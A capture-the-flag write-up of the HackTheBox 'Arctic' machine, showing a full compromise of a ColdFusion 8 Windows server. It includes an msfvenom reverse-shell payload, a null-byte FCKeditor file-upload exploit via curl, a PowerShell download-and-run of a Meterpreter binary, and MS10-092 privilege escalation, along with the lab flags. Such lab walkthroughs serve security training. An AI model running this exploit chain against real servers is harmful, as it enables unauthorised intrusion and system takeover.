HackTheBox: Arctic

ColdFusion Windows Easy File Upload RCE

Step 1: Service Enumeration

Initial Nmap scan reveals open ports including a webserver on port 8500:

[msf] >> db_nmap -p- -T5 --min-rate=5000 -Pn artic.htb
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown

Version scan reveals ColdFusion 8 running on port 8500:

[msf] >> db_nmap -p135,8500,49154 -sVC -A artic.htb
8500/tcp  open  http    ColdFusion 8
Service Info: OS: Windows

Step 2: Web Enumeration

Navigating to http://artic.htb:8500/CFIDE/administrator/ reveals the ColdFusion 8 admin login page. ColdFusion 8 is known to have multiple vulnerabilities.

Searching for available exploits:

┌─[elliot@parrot]─[~/cold]
└──╼ $searchsploit coldfusion 8
Adobe ColdFusion 8 - Remote Command Execution (RCE) | cfm/webapps/50057.py
ColdFusion 8.0.1 - Arbitrary File Upload / Execution (Metasploit) | cfm/webapps/16788.rb

Step 3: Creating Malicious Payload

Generate a JSP reverse shell payload:

┌─[elliot@parrot]─[~/cold]
└──╼ $msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=1234 -f raw > shell.jsp
Payload size: 1497 bytes

Step 4: Exploiting File Upload

Upload the malicious JSP file using the ColdFusion FCKeditor vulnerability:

┌─[elliot@parrot]─[~/cold]
└──╼ $curl -X POST -F newfile=@shell.jsp \
  'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/df.jsp%00'

<script type="text/javascript">
    window.parent.OnUploadCompleted( 202, "", "shell.jsp", "0" );
</script>

Trigger the uploaded shell:

┌─[elliot@parrot]─[~/cold]
└──╼ $curl 'http://10.10.10.11:8500/userfiles/file/df.jsp'

Step 5: Reverse Shell & User Flag

Start a netcat listener to catch the reverse shell:

┌─[elliot@parrot]─[~/cold]
└──╼ $rlwrap nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.11] 49388
Microsoft Windows [Version 6.1.7600]

C:\ColdFusion8\runtime\bin>whoami
arctic\tolis

Navigate to user desktop for the user flag:

C:\>cd Users\tolis\Desktop
C:\Users\tolis\Desktop>type user.txt
6a9ca50700ca9fc25e3eaacfc0268c3c

Step 6: Privilege Escalation to SYSTEM

Check privileges with whoami /priv:

C:\ColdFusion8>whoami /priv
PRIVILEGES INFORMATION
----------------------
SeImpersonatePrivilege      Enabled
SeCreateGlobalPrivilege     Enabled

Upload a Meterpreter payload for better post-exploitation:

┌─[elliot@parrot]─[~/cold]
└──╼ $msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.15 lport=4321 -f exe > shell.exe

┌─[elliot@parrot]─[~/cold]
└──╼ $python -m http.server

Download and execute on target:

C:\ColdFusion8\runtime\bin>powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.15:8000/shell.exe','shell.exe')"
C:\ColdFusion8\runtime\bin>.\shell.exe

Use local exploit suggester to find privilege escalation vector:

[msf] >> use exploit/windows/local/ms10_092_schelevator
[msf] >> set SESSION 4
[msf] >> set LHOST tun0
[msf] >> set LPORT 4445
[msf] >> run

[*] Command shell session opened
C:\Windows\system32>whoami
nt authority\system

Navigate to Administrator's Desktop for root flag:

C:\>cd Users\Administrator\Desktop
C:\Users\Administrator\Desktop>type root.txt
dcdf90a06ce50f7ea4dba0c1cde61b3f

Key Takeaways

  • ColdFusion 8 - Legacy Adobe ColdFusion with known RCE vulnerabilities
  • FCKeditor File Upload - Arbitrary file upload leading to RCE
  • SeImpersonatePrivilege - Enabled privilege allows token impersonation
  • MS10-092 Schelevator - Task scheduler privilege escalation

This machine demonstrates the importance of keeping web applications updated and securing file upload functionality.
